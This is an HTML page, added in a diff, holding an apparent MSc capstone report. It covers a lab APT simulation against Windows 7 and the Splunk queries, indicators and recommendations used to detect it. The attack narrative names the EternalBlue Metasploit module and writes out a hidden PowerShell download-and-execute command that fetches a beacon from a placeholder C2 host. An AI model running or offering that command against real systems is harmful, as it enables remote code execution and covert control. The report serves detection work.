@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Technical Report: APT Simulation - Rishi Jayavel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0a0a0a;
+            color: #d1d5db;
+        }
+        h1, h2, h3, h4, h5, h6, code {
+            font-family: 'Roboto Mono', monospace;
+        }
+        .report-container {
+            max-width: 1024px;
+            margin: auto;
+            background-color: #111827;
+            border: 1px solid #08d9d6;
+            box-shadow: 0 0 20px rgba(8, 217, 214, 0.2);
+        }
+        .report-header h1 {
+            color: #08d9d6;
+            text-shadow: 0 0 5px rgba(8, 217, 214, 0.7);
+        }
+        .section-title {
+            color: #08d9d6;
+            border-bottom: 2px solid #08d9d6;
+            padding-bottom: 8px;
+            margin-bottom: 1.5rem;
+        }
+        code {
+            background-color: #1e293b;
+            color: #e2e8f0;
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+        }
+        th, td {
+            border: 1px solid #374151;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #1e293b;
+            color: #08d9d6;
+        }
+        blockquote {
+            border-left: 4px solid #08d9d6;
+            padding-left: 1rem;
+            margin-left: 0;
+            font-style: italic;
+            color: #9ca3af;
+        }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+    <div class="report-container p-6 md:p-10 rounded-lg">
+        
+        <!-- Report Header -->
+        <header class="report-header text-center mb-10">
+            <h1 class="text-3xl md:text-4xl font-bold">Technical Report</h1>
+            <p class="text-lg text-gray-400">Advanced Persistent Threat (APT) Simulation & SIEM Detection Analysis</p>
+        </header>
+
+        <table class="mb-10 text-sm">
+            <thead>
+                <tr>
+                    <th>Report ID</th>
+                    <th>Project Author</th>
+                    <th>Date of Report</th>
+                    <th>Classification</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>RJ-APT-SIM-001</code></td>
+                    <td>Rishi Jayavel</td>
+                    <td>July 31, 2025</td>
+                    <td>Internal Technical - MSc Capstone</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <!-- Section 1: Executive Summary -->
+        <section class="mb-10">
+            <h2 class="section-title text-2xl font-bold">1.0 Executive Summary</h2>
+            <p class="mb-4">This report provides a detailed analysis of a simulated cyber-attack designed to emulate the Tactics, Techniques, and Procedures (TTPs) of an Advanced Persistent Threat (APT). The primary objective was to rigorously test and evaluate the detection and response capabilities of a deployed Security Information and Event Management (SIEM) platform, Splunk Enterprise, within a controlled corporate network environment.</p>
+            <p class="mb-4">The simulation encompassed a full attack lifecycle, beginning with initial access via exploitation, followed by the establishment of a persistent Command and Control (C2) channel using a custom beacon. Subsequent actions included privilege escalation, lateral movement discovery, and the deployment of a ransomware payload as the final action on objectives.</p>
+            <h3 class="text-xl font-semibold text-white mb-3">Key Strategic Findings:</h3>
+            <ul class="list-disc list-inside space-y-2">
+                <li><strong>Comprehensive Detection:</strong> All stages of the sophisticated attack chain were successfully identified and correlated within Splunk, validating the efficacy of a well-configured SIEM.</li>
+                <li><strong>Behavioral Analysis is Paramount:</strong> The simulation underscored that signature-based detections are insufficient for modern threats. The C2 beacon was only detectable through targeted threat hunting and behavioral analysis of network logs.</li>
+                <li><strong>Criticality of Endpoint Logging:</strong> The success of the detection effort was heavily reliant on rich endpoint telemetry provided by Sysmon and PowerShell Script Block Logging.</li>
+            </ul>
+        </section>
+
+        <!-- Section 2: Attack Flow Diagram -->
+        <section class="mb-10">
+            <h2 class="section-title text-2xl font-bold">2.0 Attack Flow Diagram (Kill Chain)</h2>
+            <div class="bg-gray-900 p-4 rounded-lg">
+                <pre class="text-green-400"><code>[External Attacker]
+      |
+      | 1. Initial Access (Exploit SMB - T1190)
+      v
+[Workstation: Windows 7] --(2. C2 Beaconing over HTTP - T1071.001)--> [C2 Server: Kali Linux]
+      |
+      | 3. Privilege Escalation (Kernel Exploit - T1068)
+      v
+[Workstation: SYSTEM Privileges]
+      |
+      | 4. Defense Evasion (Obfuscated PowerShell - T1027)
+      v
+[Workstation: Ransomware Execution]
+      |
+      | 5. Impact (Data Encryption - T1486)
+      v
+[Encrypted Files]</code></pre>
+            </div>
+        </section>
+
+        <!-- Section 3: Attack Narrative -->
+        <section class="mb-10">
+            <h2 class="section-title text-2xl font-bold">3.0 Attack Narrative & Technical Execution</h2>
+            <blockquote class="mb-6">
+                <strong>Objective:</strong> To gain persistent access to the internal network and deploy a destructive payload, while evading initial detection.
+            </blockquote>
+            <ol class="list-decimal list-inside space-y-4">
+                <li><strong>Initial Access:</strong> The attack was initiated from a Kali Linux machine targeting a known, unpatched Windows 7 workstation. The Metasploit Framework was used to launch the <code>exploit/windows/smb/ms17_010_eternalblue</code> module with a reverse TCP Meterpreter payload.</li>
+                <li><strong>Command & Control (C2) Establishment:</strong> Upon gaining the initial shell, a PowerShell one-liner was issued to download and execute a custom C2 beacon script, establishing an HTTP-based C2 channel with randomized jitter to avoid perfect periodicity. <br><code>powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://&lt;C2_IP&gt;/beacon.ps1')"</code></li>
+                <li><strong>Privilege Escalation:</strong> The <code>getsystem</code> command in Metasploit was used, leveraging named pipe impersonation techniques to escalate the session's privileges to <code>NT AUTHORITY\SYSTEM</code>.</li>
+                <li><strong>Defense Evasion & Payload Staging:</strong> The ransomware script was encoded in Base64, delivered via the C2 channel, and written to a temporary file before being decoded and executed from memory.</li>
+                <li><strong>Impact:</strong> The executed ransomware script recursively scanned user directories, encrypting <code>.docx</code>, <code>.pdf</code>, and <code>.jpg</code> files by appending a <code>.locked</code> extension.</li>
+            </ol>
+        </section>
+
+        <!-- Section 4: SIEM Detection Analysis -->
+        <section class="mb-10">
+            <h2 class="section-title text-2xl font-bold">4.0 SIEM Detection Analysis & Threat Hunting</h2>
+            <div class="overflow-x-auto">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Tactic (MITRE ATT&CK®)</th>
+                            <th>Technique & Description</th>
+                            <th>SIEM Detection & Analysis (Splunk)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>TA0011: Command & Control</strong></td>
+                            <td><strong>T1071.001: Application Layer Protocol</strong><br>The beacon sent periodic HTTP GET requests to the C2 server.</td>
+                            <td><strong>Threat Hunt Query:</strong><br><code>index=network sourcetype=stream:http http_method=GET | stats count, earliest(_time) as first_seen, latest(_time) as last_seen by src_ip, dest_ip, user_agent | eval duration = last_seen - first_seen | where duration > 300 AND count > 5</code><br><br><strong>Analysis:</strong> This query hunts for long-running, periodic connections, identifying the beacon's unique traffic pattern.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>TA0004: Privilege Escalation</strong></td>
+                            <td><strong>T1068: Exploitation for Privilege Escalation</strong><br>The <code>getsystem</code> command created a new process under the <code>SYSTEM</code> context.</td>
+                            <td><strong>Detection Query:</strong><br><code>index=endpoint sourcetype="Sysmon" EventCode=1 ParentImage="*\\services.exe" | stats count by Image, ParentImage, User</code><br><br><strong>Analysis:</strong> Sysmon logs showed a <code>cmd.exe</code> process being spawned by <code>services.exe</code>, a highly anomalous parent-child relationship.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>TA0005: Defense Evasion</strong></td>
+                            <td><strong>T1027: Obfuscated Files or Information</strong><br>PowerShell was used to decode the Base64 ransomware payload.</td>
+                            <td><strong>Detection Query:</strong><br><code>index=endpoint sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 "FromBase64String"</code><br><br><strong>Analysis:</strong> PowerShell Script Block Logging (EventID 4104) captured the full script, and searching for <code>FromBase64String</code> revealed the de-obfuscation.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>TA0040: Impact</strong></td>
+                            <td><strong>T1486: Data Encrypted for Impact</strong><br>The script rapidly encrypted user files.</td>
+                            <td><strong>Detection Query:</strong><br><code>index=endpoint sourcetype="Sysmon" EventCode=11 TargetFilename="*.locked" | stats count by ProcessName | where count > 50</code><br><br><strong>Analysis:</strong> This high-confidence query detects a single process creating hundreds of files with the <code>.locked</code> extension, a definitive sign of ransomware.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Section 5: IoCs -->
+        <section class="mb-10">
+            <h2 class="section-title text-2xl font-bold">5.0 Indicators of Compromise (IoCs)</h2>
+            <ul class="list-disc list-inside space-y-2 font-mono text-sm">
+                <li><strong>Attacker IP:</strong> 192.168.1.105</li>
+                <li><strong>Malicious File Hash (SHA-256):</strong> a34f...d8c1 (beacon.ps1)</li>
+                <li><strong>Network Signature:</strong> Outbound HTTP GET to 192.168.1.105 with user agent containing "WindowsPowerShell"</li>
+                <li><strong>File Artifacts:</strong> Files created with the <code>.locked</code> extension.</li>
+            </ul>
+        </section>
+
+        <!-- Section 6: Recommendations -->
+        <section>
+            <h2 class="section-title text-2xl font-bold">6.0 Recommendations</h2>
+            <ol class="list-decimal list-inside space-y-3">
+                <li><strong>Enrich Network Telemetry:</strong> Ingest firewall, proxy, and DNS logs into the SIEM to correlate beaconing with suspicious domain queries.</li>
+                <li><strong>Create High-Fidelity Alerts:</strong> Convert the Splunk queries listed above into saved searches that trigger high-priority alerts for the SOC team.</li>
+                <li><strong>Harden Endpoints:</strong> Deploy Attack Surface Reduction (ASR) rules to block malicious PowerShell behavior and ensure Sysmon is deployed via GPO.</li>
+                <li><strong>Conduct Regular Threat Hunts:</strong> Schedule regular, hypothesis-driven threat hunts based on the MITRE ATT&CK framework to proactively search for undetected malicious activity.</li>
+            </ol>
+        </section>
+
+    </div>
+
+</body>
+</html>
